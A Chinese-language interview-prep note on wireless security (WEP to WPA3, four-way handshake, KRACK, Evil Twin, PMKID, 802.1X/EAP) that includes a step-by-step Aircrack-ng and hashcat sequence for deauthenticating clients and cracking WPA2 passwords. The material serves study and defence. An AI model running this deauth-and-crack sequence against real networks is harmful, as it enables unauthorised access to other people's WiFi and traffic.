# Day 12：无线安全基础

> 🎯 面试目标：掌握WiFi安全协议演进(WEP→WPA→WPA2→WPA3)及无线攻击防御面试题

## 知识速览

### 核心概念
- **WEP(Wired Equivalent Privacy)**：已完全破解，RC4流密码+短IV(24bit)导致IV碰撞→可恢复密钥，Aircrack-ng几分钟即可破解
- **WPA/WPA2**：引入TKIP(临时)→CCMP(AES)，四步握手(4-Way Handshake)认证，WPA2仍是目前主流企业标准
- **WPA3**：引入SAE(对等实体同时认证)替代PSK、前向保密(forward secrecy)、192位企业安全模式、WiFi Enhanced Open
- **KRACK攻击(2017)**：利用WPA2四步握手中的Nonce重用漏洞，可解密/注入数据包，影响所有WiFi设备
- **802.1X/EAP**：企业级WiFi认证框架，配合RADIUS服务器实现用户级认证，常见EAP类型：PEAP、EAP-TLS、EAP-TTLS

### 必问考点
| 面试官可能怎么问 | 你应该怎么答 |
|------------------|--------------|
| WPA2四步握手中每一步的作用是什么？ | 第1步：AP→Client，发送ANonce(AP随机数)；第2步：Client→AP，发送SNonce+MIC(完整性校验)，Client已可生成PTK；第3步：AP→Client，发送GTK加密后的消息+MIC，AP确认Client合法性；第4步：Client→AP，确认收到GTK。核心：PTK=PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)。 |
| WPA3相比WPA2解决了哪3个核心安全问题？ | 1)SAE防离线字典攻击——不再允许抓包后离线破解密码(每次尝试需在线交互)；2)前向保密——即使密码泄露也无法解密历史流量；3)Easy Connect——通过QR码安全接入IoT设备(DPP协议)。面试加分：提及Dragonfly密钥交换算法。 |
| Evil Twin攻击的原理和防御？ | 攻击者伪造同名WiFi热点，诱骗用户连接后窃取凭证/流量。防御：1)服务器证书验证(PEAP/EAP-TLS) 2)802.11w管理帧保护 3)用户安全意识(不连不信任WiFi) 4)企业部署WPA3-Enterprise |
| PMKID攻击是什么？为什么比传统抓握手包更高效？ | WPA3/SAE之前的WPA2实现中，AP可能直接在EAPOL帧中发送PMKID(从PMK派生)。攻击者用hcxdumptool直接请求PMKID→无需等待客户端连接→离线用hashcat破解。速度快、隐蔽性高、不产生断开连接日志。 |
| 企业WiFi部署中802.1X+EAP-TLS的认证流程？ | 1)Client关联AP→端口未授权(仅允许EAPOL)；2)Client通过EAP-TLS向RADIUS提交客户端证书；3)RADIUS验证证书→返回EAP-Success；4)生成PMK→四步握手→数据端口打开。强调：证书失效=无法入网，比PEAP(用密码)更安全。 |

### 技术细节
**Aircrack-ng 破解WPA2完整流程**：
```bash
# 1. 开启监听模式
airmon-ng start wlan0

# 2. 扫描目标
airodump-ng wlan0mon

# 3. 针对目标AP抓包(记录握手包)
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon

# 4. 发送Deauth强制客户端重连(抓握手包)
aireplay-ng -0 10 -a <AP_MAC> -c <Client_MAC> wlan0mon

# 5. 离线破解
aircrack-ng -w wordlist.txt capture-01.cap
# 或用 hashcat
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
```
**防御侧**：部署WPA3-SAE、启用802.11w PMF(保护管理帧)、定期审计周围WiFi环境(Kismet)、使用复杂的WiFi密码(>16字符)。

## 常见陷阱
- ⚠️ 认为MAC过滤是有效安全措施——MAC地址可轻易伪造，不能作为主要防御手段
- ⚠️ 忽视WPS PIN安全——8位PIN可暴力破解(前4后3+checksum)，禁用WPS是基本安全要求
- ⚠️ 混淆PMK和PTK——PMK从密码派生(固定)，PTK=PRF(PMK+Nonces+MACs)(每会话不同)，攻击者破解的是PMK

## 今日检测
1. 用Wireshark抓取一次WPA2四步握手，识别ANonce/SNonce/MIC字段
2. 搭建一个WPA3-SAE测试环境(Hostapd)，对比与WPA2的交互差异
3. 阅读WiFi Alliance的WPA3规格白皮书，准备一段对话式介绍
